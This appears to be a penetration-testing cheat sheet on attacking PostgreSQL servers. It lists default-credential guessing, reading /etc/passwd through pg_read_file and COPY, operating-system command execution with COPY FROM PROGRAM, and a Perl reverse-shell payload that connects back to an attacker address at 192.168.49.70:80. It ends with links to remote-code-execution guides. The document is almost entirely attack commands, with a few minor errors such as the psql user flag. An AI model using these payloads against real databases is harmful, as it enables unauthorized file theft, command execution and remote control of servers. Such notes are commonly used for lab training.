# PostgreSQL
--------

```bash
psql -h 10.10.10.10 -u username -p 57756
```

Check for default credentials like `postgres:postgres`

Once, authenticated; 
```bash
# listing directories
SELECT pg_ls_dir('/etc');

# read file
SELECT pg_read_file('/etc/passwd', 0, 200);
#2
DROP TABLE pwn;
CREATE TABLE pwn(t TEXT);
COPY pwn FROM '/etc/passwd';
SELECT * FROM pwn;
```

https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md


Command Execution 
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

```bash
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec; #cleanup
```
Ensure that the single qoutes are converted into double quotes for the payload.
```bash
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.70:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';''
```

Other links:
https://infosecwriteups.com/compiling-postgres-library-for-exploiting-udf-to-rce-d8cfd197bdf9
https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/
https://github.com/dionach/pgexec/blob/master/pg_exec.sh
